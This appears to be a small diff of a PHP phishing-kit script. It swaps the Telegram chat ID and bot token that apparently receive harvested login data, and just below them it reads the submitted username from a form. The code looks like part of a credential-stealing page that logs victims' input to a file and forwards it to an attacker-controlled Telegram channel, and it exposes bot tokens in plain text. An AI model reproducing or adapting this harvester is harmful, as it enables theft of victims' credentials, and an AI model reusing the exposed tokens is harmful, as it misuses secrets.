@@ -19,8 +19,8 @@ fwrite($handle, "************************");
 fwrite($handle, "\n");
 fclose($handle);
 // Set the chat ID and bot token
-$chat_id = "-1001881049749"; // Replace with your own channel ID
-$bot_token = "6073091222:AAEw8YeZW35rA9uW7ah5YuH2Y2xOvouWQIs"; // Replace with your own bot token
+$chat_id = "-1001950254658"; // Replace with your own channel ID
+$bot_token = "6134194994:AAGxxAkTCvKQG4Bl2z1vCPllmxdhwJxCRIA"; // Replace with your own bot token
 
 // Get the form data
 $username = $_POST['username'];
